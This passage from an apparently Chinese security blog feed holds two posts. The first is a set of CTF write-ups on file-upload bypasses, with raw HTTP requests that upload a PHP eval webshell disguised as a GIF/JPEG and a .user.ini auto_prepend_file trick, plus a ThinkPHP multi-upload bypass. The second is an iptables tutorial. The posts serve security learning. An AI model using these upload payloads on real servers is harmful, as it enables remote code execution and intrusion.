Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.135 Safari&#x2F;537.36 Edg&#x2F;84.0.522.63</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;1b930c8d-beda-47e3-ba7c-85bc358075d3.node3.buuoj.cn&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,en-GB;q&#x3D;0.7,en-US;q&#x3D;0.6</span><br><span class="line">Cookie: PHPSESSID&#x3D;ae2f4a4366a5ea0ece393127ad9b864e</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryWrINBQvOPdxaBJwJ</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;uploaded&quot;; filename&#x3D;&quot;basic_php_webshell.png&quot;</span><br><span class="line">Content-Type: image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;@ eval($_POST[A]);&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryWrINBQvOPdxaBJwJ</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">upload</span><br><span class="line">------WebKitFormBoundaryWrINBQvOPdxaBJwJ--</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>技术点：</p><ul><li>.user.ini 文件重写绕过黑名单GetShell</li></ul><p>技术概述：</p><p><strong>auto_prepend_file</strong>是在文件前插入；<strong>auto_append_file</strong>在文件最后插入（当文件调用的有<code>exit()</code>时该设置无效）</p><p>利用条件：</p><ul><li>服务器脚本语言为PHP</li><li>服务器使用CGI／FastCGI模式</li><li>上传目录下要有可执行的php文件</li></ul><p>技术点细节参考：<a href="https://www.leavesongs.com/PENETRATION/php-user-ini-backdoor.html">https://www.leavesongs.com/PENETRATION/php-user-ini-backdoor.html</a></p><ul><li>满足条件一：上传目录下有可执行的php文件</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200830225232.png" alt="image-20200830225229206"></p><p>利用过程：</p><p>先上传<code>.user.ini</code> 文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;index.php HTTP&#x2F;1.1</span><br><span class="line">Host: 870fbc35-aa6b-40c3-9ea0-b854574f86a2.node3.buuoj.cn</span><br><span class="line">Content-Length: 336</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;870fbc35-aa6b-40c3-9ea0-b854574f86a2.node3.buuoj.cn</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundary6dvjBUhTD4exggyU</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.135 Safari&#x2F;537.36 Edg&#x2F;84.0.522.63</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;870fbc35-aa6b-40c3-9ea0-b854574f86a2.node3.buuoj.cn&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,en-GB;q&#x3D;0.7,en-US;q&#x3D;0.6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary6dvjBUhTD4exggyU</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;fileUpload&quot;; filename&#x3D;&quot;.user.ini&quot;</span><br><span class="line">Content-Type: image&#x2F;png</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">auto_prepend_file&#x3D;basic_php_webshell.jpg</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary6dvjBUhTD4exggyU</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;upload&quot;</span><br><span class="line"></span><br><span class="line">提交</span><br><span class="line">------WebKitFormBoundary6dvjBUhTD4exggyU--</span><br></pre></td></tr></table></figure><p>上传WebShell（<strong>需要绕过&lt;? 和 Content-Type</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;index.php HTTP&#x2F;1.1</span><br><span class="line">Host: 870fbc35-aa6b-40c3-9ea0-b854574f86a2.node3.buuoj.cn</span><br><span class="line">Content-Length: 359</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;870fbc35-aa6b-40c3-9ea0-b854574f86a2.node3.buuoj.cn</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundary8yvecxrZpVYWNxvE</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.135 Safari&#x2F;537.36 Edg&#x2F;84.0.522.63</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;870fbc35-aa6b-40c3-9ea0-b854574f86a2.node3.buuoj.cn&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,en-GB;q&#x3D;0.7,en-US;q&#x3D;0.6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary8yvecxrZpVYWNxvE</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;fileUpload&quot;; filename&#x3D;&quot;basic_php_webshell.jpg&quot;</span><br><span class="line">Content-Type: image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;@eval($_POST[A]);&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary8yvecxrZpVYWNxvE</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;upload&quot;</span><br><span class="line"></span><br><span class="line">提交</span><br><span class="line">------WebKitFormBoundary8yvecxrZpVYWNxvE--</span><br></pre></td></tr></table></figure><h2 id="RoarCTF-2019-Simple-Upload"><a href="#RoarCTF-2019-Simple-Upload" class="headerlink" title="[RoarCTF 2019]Simple Upload"></a>[RoarCTF 2019]Simple Upload</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $uploadFile = $_FILES[<span class="string">&#x27;file&#x27;</span>] ;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (strstr(strtolower($uploadFile[<span class="string">&#x27;name&#x27;</span>]), <span class="string">&quot;.php&quot;</span>) ) &#123; <span class="comment">// 检测文件后缀是否含有php</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $upload = <span class="keyword">new</span> \Think\Upload();<span class="comment">// 实例化上传类</span></span><br><span class="line">        $upload-&gt;maxSize  = <span class="number">4096</span> ;<span class="comment">// 设置附件上传大小</span></span><br><span class="line">        $upload-&gt;allowExts  = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>);<span class="comment">// 设置附件上传类型</span></span><br><span class="line">        $upload-&gt;rootPath = <span class="string">&#x27;./Public/Uploads/&#x27;</span>;<span class="comment">// 设置附件上传目录</span></span><br><span class="line">        $upload-&gt;savePath = <span class="string">&#x27;&#x27;</span>;<span class="comment">// 设置附件上传子目录</span></span><br><span class="line">        $info = $upload-&gt;upload() ;</span><br><span class="line">        <span class="keyword">if</span>(!$info) &#123;<span class="comment">// 上传错误提示错误信息</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;error($upload-&gt;getError());</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">// 上传成功 获取上传文件信息</span></span><br><span class="line">            $url = __ROOT__.substr($upload-&gt;rootPath,<span class="number">1</span>).$info[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savepath&#x27;</span>].$info[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savename&#x27;</span>] ;</span><br><span class="line">            <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">&quot;url&quot;</span>=&gt;$url,<span class="string">&quot;success&quot;</span>=&gt;<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Thinkphp 的多文件上传(当upload()函数不传参数时,默认为多文件上传,整个$_FILES数组的文件都会被上传)</li><li>uniqid 设置文件路径不合理, 存在可爆破的可能性</li><li><code>$upload-&gt;allowExts  = array(&#39;jpg&#39;, &#39;gif&#39;, &#39;png&#39;, &#39;jpeg&#39;);</code> allowExts 方法用于检测文件名就没用了, 因为这种情况默认只检查一次, 而多文件上传时就绕过了文件检测</li></ul><p>思路 : </p><ol><li>获取文件上传的默认路径</li><li>伪造文件上传的HTTP Request 请求包</li><li>上传多个文件</li><li>对文件名进行爆破(因为<strong>连续上传的文件,uniqid处理是微秒级别的</strong>,所以差别不会太大)</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;文件上传漏洞技术点&quot;&gt;&lt;a href=&quot;#文件上传漏洞技术点&quot; class=&quot;headerlink&quot; title=&quot;文件上传漏洞技术点&quot;&gt;&lt;/a&gt;文件上传漏洞技术点&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;参考资料：&lt;a href=&quot;http://gv7.me/a</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://hack-for.fun/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>iptables 学习</title>
    <link href="https://hack-for.fun/13bb2df2.html"/>
    <id>https://hack-for.fun/13bb2df2.html</id>
    <published>2020-08-26T07:17:09.000Z</published>
    <updated>2020-08-26T15:25:09.938Z</updated>
    
    <content type="html"><![CDATA[<p>参考资料： </p><p>(内容和图片)</p><p>全教程系列</p><p><a href="http://www.zsythink.net/archives/tag/iptables/">iptables 入门系列</a></p><blockquote><p>作为安全狗 ，自认为知道概念和基础操作就行了（搞安全的要学的东西真的太多了。</p></blockquote><p>原作者一开始讲了防火墙的知识，算不错的科普。</p><h1 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h1><blockquote><p>从逻辑上讲。防火墙可以大体分为主机防火墙和网络防火墙。</p></blockquote><p>主机防火墙：针对于单个主机进行防护。</p><p>网络防火墙：往往处于网络入口或边缘，针对于网络入口进行防护，服务于防火墙背后的本地局域网。</p><p>网络防火墙和主机防火墙并不冲突，可以理解为，网络防火墙主外（集体）， 主机防火墙主内（个人）。</p><hr><blockquote><p>从物理上讲，防火墙可以分为硬件防火墙和软件防火墙。</p></blockquote><p>硬件防火墙：在硬件级别实现部分防火墙功能，另一部分功能基于软件实现，性能高，成本高。</p><p>软件防火墙：应用软件处理逻辑运行于通用硬件平台之上的防火墙，性能低，成本低。</p><p>而渗透测试过程中，常常会遇见WAF，Web Application Firewall（Web 应用防火墙。比如长亭的雷池（SafeLine），基于语义分析，非常厉害，要是遇到了就别想怎么绕了（×</p><h1 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h1><p><code>iptables</code> 只有Linux 系的系统才有。</p><p><strong>iptables</strong>其实不是真正的防火墙，我们可以把它理解成一个客户端代理，用户通过iptables这个代理，将用户的安全设定执行到对应的”安全框架”中，这个”安全框架”才是真正的防火墙，这个框架的名字叫<strong>netfilter</strong></p><p>netfilter才是防火墙真正的安全框架（framework），netfilter位于内核空间。</p><p>iptables其实是一个命令行工具，位于用户空间，我们用这个工具操作真正的框架。</p><p>netfilter/iptables（下文中简称为iptables）组成Linux平台下的包过滤防火墙，与大多数的Linux软件一样，这个包过滤防火墙是免费的，它可以代替昂贵的商业防火墙解决方案，完成<code>封包过滤</code>、<code>封包重定向</code>和<code>网络地址转换（NAT）</code>等功能。</p><p>Netfilter是Linux操作系统核心层内部的一个数据包处理模块，它具有如下功能：</p><ul><li><p>网络地址转换(Network Address Translate)</p></li><li><p>数据包内容修改</p></li><li><p>数据包过滤的防火墙功能</p></li></ul><p>所以说，虽然我们使用service iptables start启动iptables”服务”，但是其实准确的来说，iptables并<code>没有一个守护进程</code>，所以并不能算是真正意义上的服务，而应该算是<code>内核提供的功能</code>。</p><h2 id="Iptables-基础"><a href="#Iptables-基础" class="headerlink" title="Iptables 基础"></a>Iptables 基础</h2><p>Iptables 是按照“规则”办事的，规则其实就是网络管理员预定义的条件，规则一般的定义为<code>&quot;如果数据包头符合这样的条件，就这样处理这个数据包&quot;</code>。</p><blockquote><p>规则存储在内核空间的信息包过滤表中，这些规则分别指定了源地址、目的地址、传输协议（如TCP、UDP、ICMP）和服务类型（如HTTP、FTP和SMTP）等。当数据包与规则匹配时，iptables就根据规则所定义的方法来处理这些数据包，如放行（accept）、拒绝（reject）和丢弃（drop）等。配置防火墙的主要工作就是添加、修改和删除这些规则。</p></blockquote><p>当客户端访问服务器的web服务时，客户端发送报文到网卡，而<strong>tcp/ip协议栈是属于内核的一部分</strong>，所以，客户端的信息会通过内核的TCP协议传输到用户空间中的web服务中，而此时，客户端报文的目标终点为web服务所监听的套接字（IP：Port）上，当web服务需要响应客户端请求时，web服务发出的响应报文的目标终点则为客户端，这个时候，web服务所监听的IP与端口反而变成了原点，我们说过，netfilter才是真正的防火墙，它是内核的一部分，所以，如果我们想要防火墙能够达到”防火”的目的，则需要在内核中设置关卡，所有进出的报文都要通过这些关卡，经过检查后，符合放行条件的才能放行，符合阻拦条件的则需要被阻止，于是，就出现了input关卡和output关卡，<strong>而这些关卡在iptables中不被称为”关卡”,而被称为”链”。</strong></p><p><img src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_1.png"></p><p>上面描述的场景并不完善，因为<strong>客户端发来的报文访问的目标地址可能并不是本机，而是其他服务器，当本机的内核支持IP_FORWARD时，我们可以将报文转发给其他服务器</strong>，所以，这个时候，我们就会提到iptables中的其他”关卡”，也就是其他”链”，他们就是  “路由前”、”转发”、”路由后”，他们的英文名是</p><p>PREROUTING、FORWARD、POSTROUTING</p><p>根据实际情况的不同，报文经过”链”可能不同。<strong>如果报文需要转发，那么报文则不会经过input链发往用户空间，而是直接在内核空间中经过forward链和postrouting链转发出去的。</strong></p><p><img src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_2.png"></p><p>常见场景中报文的流向：</p><ul><li><p>到本机某进程的报文：PREROUTING –&gt; INPUT</p></li><li><p>由本机转发的报文：PREROUTING –&gt; FORWARD –&gt; POSTROUTING</p></li><li><p>由本机的某进程发出报文（通常为响应报文）：OUTPUT –&gt; POSTROUTING</p></li></ul><h2 id="链的概念"><a href="#链的概念" class="headerlink" title="链的概念"></a>链的概念</h2><p>为什么“关卡” 在 iptables 中被称做“链：</p><p>防火墙的作用就在于对经过报文匹配“规则”，然后执行相对应的“动作”。然而关卡上不只只有一条规则，而且有很多条规则，当我们把这些规则串到一个链条上的时候，就形成了”链”。</p><p><img src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_3.png"></p><p>每个经过这个”关卡”的报文，都要将这条”链”上的所有规则匹配一遍，如果有符合条件的规则，则执行规则对应的动作。</p><h2 id="表的概念"><a href="#表的概念" class="headerlink" title="表的概念"></a>表的概念</h2><blockquote><p>我们再想想另外一个问题，我们对每个”链”上都放置了一串规则，但是这些规则有些很相似，比如，A类规则都是对IP或者端口的过滤，B类规则是修改报文，那么这个时候，我们是不是能<strong>把实现相同功能的规则放在一起</strong>呢，必须能的。</p></blockquote><p>把具有相同功能的规则的集合叫做”表”，所以说，不同功能的规则，我们可以放置在不同的表中进行管理，而iptables已经为我们定义了4种表，每种表对应了不同的功能，而我们定义的规则也都逃脱不了这4种功能的范围，所以，学习iptables之前，我们必须先搞明白每种表 的作用。</p><p>iptables为我们提供了如下规则的分类，或者说，iptables为我们提供了如下”表”</p><ul><li><p>filter表：负责过滤功能，防火墙；内核模块：iptables_filter</p></li><li><p>nat表：network address translation，网络地址转换功能；内核模块：iptable_nat</p></li><li><p>mangle表：拆解报文，做出修改，并重新封装 的功能；iptable_mangle</p></li><li><p>raw表：关闭nat表上启用的连接追踪机制；iptable_raw</p></li></ul><p>也就是说，我们自定义的所有规则，都是这四种分类中的规则，或者说，所有规则都存在于这4张”表”中。</p><p></p><h2 id="表链关系"><a href="#表链关系" class="headerlink" title="表链关系"></a>表链关系</h2><blockquote><p>某些“链”中注定不会包含“某类规则”。</p></blockquote><p><img src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_4.png" alt="prerouting链上的规则存在的表情况"></p><blockquote><p>prerouting”链”只拥有nat表、raw表和mangle表所对应的功能，所以，prerouting中的规则只能存放于nat表、raw表和mangle表中</p></blockquote><p>PREROUTING    的规则可以存在于：raw表，mangle表，nat表。</p><p>INPUT      的规则可以存在于：mangle表，filter表，（centos7中还有nat表，centos6中没有）。</p><p>FORWARD     的规则可以存在于：mangle表，filter表。</p><p>OUTPUT     的规则可以存在于：raw表mangle表，nat表，filter表。</p><p>POSTROUTING    的规则可以存在于：mangle表，nat表。</p><p><strong>在实际的使用过程中，往往是通过”表”作为操作入口，对规则进行定义的</strong>，之所以按照上述过程介绍iptables，是因为从”关卡”的角度更容易从入门的角度理解，但是为了以便在实际使用的时候，更加顺畅的理解它们，此处我们还要将各”表”与”链”的关系罗列出来，</p><p>表（功能）&lt;–&gt;  链（钩子）：</p><p>raw   表中的规则可以被哪些链使用：PREROUTING，OUTPUT</p><p>mangle  表中的规则可以被哪些链使用：PREROUTING，INPUT，FORWARD，OUTPUT，POSTROUTING</p><p>nat   表中的规则可以被哪些链使用：PREROUTING，OUTPUT，POSTROUTING（centos7中还有INPUT，centos6中没有）</p><p>filter  表中的规则可以被哪些链使用：INPUT，FORWARD，OUTPUT</p><hr><p>其实我们还需要注意一点，因为数据包经过一个”链”的时候，会将当前链的所有规则都匹配一遍，但是匹配时总归要有顺序，我们应该一条一条的去匹配，而且我们说过，相同功能类型的规则会汇聚在一张”表”中，那么，哪些”表”中的规则会放在”链”的最前面执行呢，这时候就需要有一个优先级的问题，我们还拿prerouting”链”做图示。<br><img src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_5.png"></p><p>prerouting链中的规则存放于三张表中，而这三张表中的规则执行的优先级如下：</p><p>raw –&gt; mangle –&gt; nat</p><p>但是我们知道，<strong>iptables为我们定义了4张”表”,当他们处于同一条”链”时，执行的优先级如下。</strong></p><p>优先级次序（由高而低）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">raw --&gt; mangle --&gt; nat --&gt; filter</span><br></pre></td></tr></table></figure><p>前面说过，某些链天生就不能使用某些表中的规则，所以，<strong>4张表中的规则处于同一条链的目前只有output链</strong>，它就是传说中海陆空都能防守的关卡。</p><h2 id="数据经过防火墙的流程"><a href="#数据经过防火墙的流程" class="headerlink" title="数据经过防火墙的流程"></a>数据经过防火墙的流程</h2><p><img src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_6.png"></p><p>我们将经常用到的对应关系重新写在此处，方便对应图例查看。</p><p>链的规则存放于哪些表中（从链到表的对应关系）：</p><p>PREROUTING  的规则可以存在于：raw表，mangle表，nat表。</p><p>INPUT     的规则可以存在于：mangle表，filter表，（centos7中还有nat表，centos6中没有）。</p><p>FORWARD    的规则可以存在于：mangle表，filter表。</p><p>OUTPUT    的规则可以存在于：raw表mangle表，nat表，filter表。</p><p>POSTROUTING  的规则可以存在于：mangle表，nat表。</p><hr><p>表中的规则可以被哪些链使用（从表到链的对应关系）：</p><p>raw   表中的规则可以被哪些链使用：PREROUTING，OUTPUT</p><p>mangle  表中的规则可以被哪些链使用：PREROUTING，INPUT，FORWARD，OUTPUT，POSTROUTING</p><p>nat   表中的规则可以被哪些链使用：PREROUTING，OUTPUT，POSTROUTING（centos7中还有INPUT，centos6中没有）</p><p>filter  表中的规则可以被哪些链使用：INPUT，FORWARD，OUTPUT</p><p>下图中nat表在centos7中的情况就不再标明。</p><p><img src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_7.png"></p><h2 id="规则的概念"><a href="#规则的概念" class="headerlink" title="规则的概念"></a>规则的概念</h2><p>规则：根据指定的匹配条件来尝试匹配每个流经此处的报文，一旦匹配成功，则由规则后面指定的处理动作进行处理</p><p>规则由匹配条件和处理动作组成。</p><ul><li>匹配条件</li></ul><p>匹配条件分为基本匹配条件与扩展匹配条件</p><p><strong>基本匹配条件：</strong></p><p>源地址Source IP，目标地址 Destination IP</p><p>上述内容都可以作为基本匹配条件。</p><p><strong>扩展匹配条件：</strong></p><p>除了上述的条件可以用于匹配，还有很多其他的条件可以用于匹配，这些条件泛称为扩展条件，这些扩展条件其实也是netfilter中的一部分，只是以模块的形式存在，如果想要使用这些条件，则需要依赖对应的扩展模块。</p><p>源端口Source Port, 目标端口Destination Port</p><p>上述内容都可以作为扩展匹配条件</p><ul><li>处理动作</li></ul><p>处理动作在iptables中被称为target（这样说并不准确，我们暂且这样称呼），动作也可以分为基本动作和扩展动作。</p><p>此处列出一些常用的动作，之后的文章会对它们进行详细的示例与总结：</p><p><strong>ACCEPT</strong>：允许数据包通过。</p><p><strong>DROP</strong>：直接丢弃数据包，不给任何回应信息，这时候客户端会感觉自己的请求泥牛入海了，过了超时时间才会有反应。</p><p><strong>REJECT</strong>：拒绝数据包通过，必要时会给数据发送端一个响应的信息，客户端刚请求就会收到拒绝的信息。</p><p><strong>SNAT</strong>：源地址转换，解决内网用户用同一个公网地址上网的问题。</p><p><strong>MASQUERADE</strong>：是SNAT的一种特殊形式，适用于动态的、临时会变的ip上。</p><p><strong>DNAT</strong>：目标地址转换。</p><p><strong>REDIRECT</strong>：在本机做端口映射。</p><p><strong>LOG</strong>：在/var/log/messages文件中记录日志信息，然后将数据包传递给下一条规则，也就是说除了记录以外不对数据包做任何其他操作，仍然让下一条规则去匹配。</p><h1 id="iptables-实际操作之规则查询"><a href="#iptables-实际操作之规则查询" class="headerlink" title="iptables 实际操作之规则查询"></a>iptables 实际操作之规则查询</h1><p>iptables为我们预定义了4张表，它们分别是raw表、mangle表、nat表、filter表，不同的表拥有不同的功能。</p><p>filter负责过滤功能，比如允许哪些IP地址访问，拒绝哪些IP地址访问，允许访问哪些端口，禁止访问哪些端口，filter表会根据我们定义的规则进行过滤，filter表应该是我们最常用到的表了，所以此处，我们以filter表为例，开始学习怎样实际操作iptables。</p><ul><li>查看filter 表中的规则</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t filter -L</span><br></pre></td></tr></table></figure><p>使用-t选项，指定要操作的表，使用-L选项，查看-t选项对应的表的规则，-L选项的意思是，列出规则，所以，上述命令的含义为列出filter表的所有规则</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200826222419.png" alt="image-20200826222325023"></p><p>从上图中可以看出，INPUT链、FORWARD链、OUTPUT链都拥有”过滤”的能力，所以，当我们要定义某条”过滤”的规则时，我们会在filter表中定义，但是具体在哪条”链”上定义规则呢？这取决于我们的工作场景。比如，<strong>我们需要禁止某个IP地址访问我们的主机，我们则需要在INPUT链上定义规则。因为，我们在理论总结中已经提到过，报文发往本机时，会经过PREROUTING链与INPUT链，如果我们想要禁止某些报文发往本机，我们只能在PREROUTING链和INPUT链中定义规则，但是PREROUTING链并不存在于filter表中，换句话说就是，PREROUTING关卡天生就没有过滤的能力，所以，我们只能在INPUT链中定义</strong>，当然，如果是其他工作场景，可能需要在FORWARD链或者OUTPUT链中定义过滤规则。</p><p>查询其他表中的规则：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">iptables -t raw -L</span><br><span class="line"></span><br><span class="line">iptables -t mangle -L</span><br><span class="line"></span><br><span class="line">iptables -t nat -L</span><br></pre></td></tr></table></figure><p>可以省略-t filter，当没有使用-t选项指定表时，默认为操作filter表，即iptables -L表示列出filter表中的所有规则。</p><ul><li>查询指定表中指定链的规则</li></ul><p>因为我的vps 没有配置iptables，所以图片就直接抄。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables -L INPUT(注意大小写)</span><br><span class="line">查询更详细的数据可以使用-v 选项</span><br><span class="line">iptables -vL INPUT</span><br></pre></td></tr></table></figure><p><code>pkts bytes target     prot opt in     out     source               destination        </code></p><p><img 